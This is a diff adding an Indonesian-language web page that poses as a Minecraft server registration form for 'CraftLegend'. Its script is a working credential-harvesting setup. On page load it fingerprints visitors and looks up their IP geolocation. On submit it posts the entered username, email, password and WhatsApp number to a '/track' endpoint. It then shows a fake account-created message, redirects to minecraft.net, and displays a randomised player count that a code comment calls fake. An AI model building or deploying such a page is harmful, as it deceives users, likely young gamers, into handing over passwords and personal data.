@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minecraft Server Indonesia - Daftar Sekarang!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Minecraft', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        @font-face {
+            font-family: 'Minecraft';
+            src: url('https://fonts.cdnfonts.com/css/minecraft-4');
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a3a 0%, #0f1a24 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        /* Minecraft block background */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: repeating-linear-gradient(
+                45deg,
+                #2a3a4a 0px,
+                #2a3a4a 2px,
+                #1f2c38 2px,
+                #1f2c38 4px
+            );
+            opacity: 0.3;
+            z-index: -1;
+        }
+        
+        .floating-block {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            background: rgba(100, 200, 100, 0.1);
+            border: 2px solid #6b8c5c;
+            animation: float 6s infinite;
+            pointer-events: none;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(180deg); }
+        }
+        
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: rgba(30, 40, 50, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5),
+                        0 0 0 2px #6b8c5c,
+                        0 0 0 4px #2a3a2a;
+            animation: slideUp 0.5s ease;
+            border: 4px solid #8b9a6b;
+            position: relative;
+            z-index: 1;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .server-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .server-icon {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(135deg, #4a6a3a 0%, #2a4a1a 100%);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 4px solid #8b9a6b;
+            box-shadow: 0 0 20px #8b9a6b;
+        }
+        
+        .server-icon span {
+            font-size: 60px;
+            filter: drop-shadow(2px 2px 0 #1a2a1a);
+        }
+        
+        .server-name {
+            color: #b3d9a0;
+            font-size: 36px;
+            font-weight: bold;
+            text-shadow: 4px 4px 0 #1a2a1a;
+            margin-bottom: 10px;
+        }
+        
+        .server-ip {
+            background: #1a2a1a;
+            color: #b3d9a0;
+            padding: 10px;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 18px;
+            display: inline-block;
+            border: 2px solid #8b9a6b;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .stat-item {
+            background: #1f2c38;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            border: 2px solid #8b9a6b;
+        }
+        
+        .stat-value {
+            color: #b3d9a0;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        .stat-label {
+            color: #8b9a6b;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        
+        .form-section {
+            background: #1f2c38;
+            padding: 30px;
+            border-radius: 15px;
+            border: 3px solid #8b9a6b;
+            margin: 30px 0;
+        }
+        
+        .form-title {
+            color: #b3d9a0;
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: center;
+            text-shadow: 2px 2px 0 #1a2a1a;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #8b9a6b;
+            font-weight: 500;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            background: #2a3a4a;
+            border: 2px solid #8b9a6b;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #b3d9a0;
+            transition: all 0.3s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #b3d9a0;
+            box-shadow: 0 0 0 3px rgba(179, 217, 160, 0.3);
+        }
+        
+        input::placeholder {
+            color: #5a6b7a;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .checkbox-group input {
+            width: auto;
+        }
+        
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #4a6a3a 0%, #2a4a1a 100%);
+            color: white;
+            border: 3px solid #8b9a6b;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-shadow: 2px 2px 0 #1a2a1a;
+            box-shadow: 0 4px 0 #1a2a1a;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 0 #1a2a1a;
+        }
+        
+        button:active {
+            transform: translateY(4px);
+            box-shadow: 0 2px 0 #1a2a1a;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .success-message {
+            text-align: center;
+            padding: 30px;
+            background: #1f2c38;
+            border: 3px solid #8b9a6b;
+            border-radius: 15px;
+            margin-top: 20px;
+        }
+        
+        .success-message h3 {
+            color: #b3d9a0;
+            font-size: 28px;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 0 #1a2a1a;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .loading-spinner {
+            border: 4px solid #2a3a4a;
+            border-top: 4px solid #b3d9a0;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .countdown {
+            font-size: 48px;
+            font-weight: bold;
+            color: #b3d9a0;
+            margin: 20px 0;
+            text-shadow: 4px 4px 0 #1a2a1a;
+        }
+        
+        .minecraft-text {
+            font-family: 'Minecraft', monospace;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #5a6b7a;
+            font-size: 12px;
+        }
+        
+        .player-count {
+            display: inline-block;
+            background: #2a3a4a;
+            padding: 5px 15px;
+            border-radius: 20px;
+            color: #b3d9a0;
+            border: 2px solid #8b9a6b;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Minecraft floating blocks -->
+    <div class="floating-block" style="top: 10%; left: 5%;"></div>
+    <div class="floating-block" style="top: 70%; right: 8%; animation-delay: 2s;"></div>
+    <div class="floating-block" style="bottom: 15%; left: 10%; animation-delay: 4s;"></div>
+
+    <div class="container" id="mainContainer">
+        <div class="server-header">
+            <div class="server-icon">
+                <span>⛏️</span>
+            </div>
+            <div class="server-name minecraft-text">CRAFTLEGEND SERVER</div>
+            <div class="server-ip minecraft-text">play.craftlegend.id</div>
+            <div class="player-count">
+                <span id="onlineCount">247</span> Pemain Online
+            </div>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-value">1.8 - 1.20</div>
+                <div class="stat-label">Versi Minecraft</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value">98%</div>
+                <div class="stat-label">Uptime</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value">⭐ 4.8</div>
+                <div class="stat-label">Rating</div>
+            </div>
+        </div>
+        
+        <!-- Form Pendaftaran Minecraft -->
+        <div class="form-section">
+            <div class="form-title minecraft-text">✦ DAFTAR SEKARANG ✦</div>
+            <p style="color: #8b9a6b; text-align: center; margin-bottom: 20px;">
+                Dapatkan akses ke server survival, minigames, dan rank gratis!
+            </p>
+            
+            <form id="minecraftForm">
+                <div class="form-group">
+                    <label>Username Minecraft <span style="color: #b3d9a0;">*</span></label>
+                    <input type="text" id="minecraftName" placeholder="Contoh: Steve_123" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Email <span style="color: #b3d9a0;">*</span></label>
+                    <input type="email" id="email" placeholder="email@example.com" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Password Server <span style="color: #b3d9a0;">*</span></label>
+                    <input type="password" id="password" placeholder="Minimal 6 karakter" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Nomor WhatsApp (untuk notifikasi)</label>
+                    <input type="tel" id="phone" placeholder="Contoh: 081234567890">
+                </div>
+                
+                <div class="form-group checkbox-group">
+                    <input type="checkbox" id="rules" required>
+                    <label style="display: inline; color: #8b9a6b;">Saya setuju dengan peraturan server</label>
+                </div>
+                
+                <div class="form-group checkbox-group">
+                    <input type="checkbox" id="newsletter">
+                    <label style="display: inline; color: #8b9a6b;">Kirim info event dan update ke email</label>
+                </div>
+                
+                <button type="submit" class="minecraft-text">⛏️ DAFTAR & MAIN SEKARANG ⛏️</button>
+            </form>
+        </div>
+        
+        <!-- Loading State -->
+        <div id="loading" class="loading hidden">
+            <div class="loading-spinner"></div>
+            <p style="color: #b3d9a0;">Mendaftarkan ke server...</p>
+            <p style="color: #8b9a6b; font-size: 14px;">Membuat akun Minecraft premium...</p>
+        </div>
+        
+        <!-- Success Message -->
+        <div id="success" class="hidden">
+            <div class="success-message">
+                <h3 class="minecraft-text">✅ PENDAFTARAN BERHASIL!</h3>
+                <p style="color: #b3d9a0; margin: 15px 0;">Akun Minecraft premium telah dibuat!</p>
+                <p style="color: #8b9a6b;">Username: <span id="displayName" style="color: #b3d9a0;"></span></p>
+                <div class="countdown" id="countdown">5</div>
+                <p style="color: #8b9a6b;">Mengarahkan ke server Minecraft...</p>
+                <p style="color: #5a6b7a; font-size: 12px; margin-top: 15px;">
+                    IP Server: play.craftlegend.id:25565
+                </p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>Server Minecraft Indonesia • Support 1.8 - 1.20 • Anti-Lag • Anti-Cheat</p>
+            <p style="margin-top: 5px;">&copy; 2024 CraftLegend Network. All rights reserved.</p>
+        </div>
+    </div>
+
+    <script>
+        // Tracking Functions
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            
+            let device = "Unknown";
+            let browser = "Unknown";
+            let os = "Unknown";
+            
+            // Detect device
+            if (/mobile/i.test(ua)) device = "Mobile";
+            else if (/tablet/i.test(ua)) device = "Tablet";
+            else device = "Desktop";
+            
+            // Detect browser
+            if (ua.indexOf("Chrome") > -1) browser = "Chrome";
+            else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
+            else if (ua.indexOf("Safari") > -1) browser = "Safari";
+            else if (ua.indexOf("Edge") > -1) browser = "Edge";
+            
+            // Detect OS
+            if (ua.indexOf("Windows") > -1) os = "Windows";
+            else if (ua.indexOf("Mac") > -1) os = "MacOS";
+            else if (ua.indexOf("Linux") > -1) os = "Linux";
+            else if (ua.indexOf("Android") > -1) os = "Android";
+            else if (ua.indexOf("iOS") > -1) os = "iOS";
+            
+            return {
+                device: device,
+                browser: browser,
+                os: os,
+                userAgent: ua,
+                platform: platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+        
+        // Get IP and location via ipapi.co
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    postal: data.postal,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    isp: data.org,
+                    timezone: data.timezone
+                };
+            } catch (error) {
+                console.log('IP fetch failed:', error);
+                return { ip: 'unknown', city: 'unknown', country: 'unknown' };
+            }
+        }
+        
+        // Track page view
+        async function trackView() {
+            const deviceInfo = getDeviceInfo();
+            const ipInfo = await getIPInfo();
+            
+            const trackingData = {
+                type: 'page_view',
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer || 'direct',
+                url: window.location.href,
+                ...deviceInfo,
+                ...ipInfo
+            };
+            
+            // Send to server
+            fetch('/track', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(trackingData)
+            }).catch(err => console.log('Track view error:', err));
+        }
+        
+        // Track form submission
+        async function trackSubmission(formData) {
+            const deviceInfo = getDeviceInfo();
+            const ipInfo = await getIPInfo();
+            
+            const trackingData = {
+                type: 'form_submission',
+                timestamp: new Date().toISOString(),
+                ...formData,
+                ...deviceInfo,
+                ...ipInfo
+            };
+            
+            // Send to server
+            fetch('/track', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(trackingData)
+            }).catch(err => console.log('Track submission error:', err));
+        }
+        
+        // Update online player count (fake)
+        function updatePlayerCount() {
+            const countElement = document.getElementById('onlineCount');
+            const current = parseInt(countElement.textContent);
+            const change = Math.floor(Math.random() * 3) - 1; // -1, 0, or 1
+            const newCount = Math.max(200, Math.min(300, current + change));
+            countElement.textContent = newCount;
+        }
+        
+        // Track page view on load
+        window.addEventListener('load', () => {
+            trackView();
+            
+            // Randomize player count every 30 seconds
+            setInterval(updatePlayerCount, 30000);
+        });
+        
+        // Handle form submission
+        document.getElementById('minecraftForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            // Get form data
+            const formData = {
+                minecraftName: document.getElementById('minecraftName').value,
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                phone: document.getElementById('phone').value,
+                rules: document.getElementById('rules').checked,
+                newsletter: document.getElementById('newsletter').checked
+            };
+            
+            // Show loading
+            document.getElementById('minecraftForm').classList.add('hidden');
+            document.getElementById('loading').classList.remove('hidden');
+            
+            // Track submission
+            await trackSubmission(formData);
+            
+            // Simulate processing
+            setTimeout(() => {
+                document.getElementById('loading').classList.add('hidden');
+                document.getElementById('success').classList.remove('hidden');
+                document.getElementById('displayName').textContent = formData.minecraftName;
+                
+                // Start countdown
+                let countdown = 5;
+                const countdownEl = document.getElementById('countdown');
+                
+                const timer = setInterval(() => {
+                    countdown--;
+                    countdownEl.textContent = countdown;
+                    
+                    if (countdown <= 0) {
+                        clearInterval(timer);
+                        // Redirect to actual Minecraft info
+                        window.location.href = 'https://www.minecraft.net/en-us/download';
+                    }
+                }, 1000);
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
